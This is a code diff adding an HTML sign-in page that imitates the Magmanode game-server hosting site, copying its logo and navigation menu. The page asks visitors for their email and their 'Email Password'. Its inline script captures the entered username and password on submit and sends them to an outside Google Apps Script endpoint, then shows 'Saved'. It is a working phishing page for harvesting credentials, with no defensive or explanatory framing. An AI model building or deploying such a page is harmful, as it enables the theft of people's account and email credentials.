@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in</title>
+    <link rel="icon" type="image/png" href="https://magmanode.com/images/logo.png">
+  <link rel="stylesheet" href="style1.css" />
+</head>
+<body>
+  <header>
+    <nav>
+        <img src="https://magmanode.com/images/logo.png" alt="Magmanode Logo" class="logo-img" />
+      <ul class="nav-links">
+        <li><a href="#">Home</a></li>
+        <li><a href="#">Create Free Server</a></li>
+        <li><a href="#">Premium Server Plans</a></li>
+        <li><a href="#">Discord</a></li>
+        <li><a href="#">Billing</a></li>
+      </ul>
+      <div class="account">Account ▾</div>
+    </nav>
+  </header>
+
+  <main>
+    <div class="login-box">
+      <img src="https://magmanode.com/images/logo.png" alt="Magmanode Logo" class="logo-img" />
+
+      <h2>Sign in to your account</h2>
+      <a class="create-link" href="#">Or create a new account</a>
+      <form id="loginForm">
+        <input type="text" id="username" placeholder="Email" required />
+        <input type="password" id="password" placeholder="Email Password" required />
+        <a class="forgot" href="#">Forgot your password?</a>
+        <button type="submit">Sign in</button>
+        <p id="status"></p>
+      </form>
+    </div>
+  </main>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzOaTp09UMLkvefJ6ks9yXr_t75IKlJGAboxEJgSQsH6Jedm_kIdgakOtwfszi6yo1y/exec';
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const data = {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value
+      };
+      fetch(scriptURL, {
+        method: 'POST',
+        body: JSON.stringify(data)
+      }).then(() => {
+        document.getElementById("status").innerText = "Saved";
+        document.getElementById("loginForm").reset();
+      }).catch(() => {
+        document.getElementById("status").innerText = "Error";
+      });
+    });
+  </script>
+</body>
+</html>
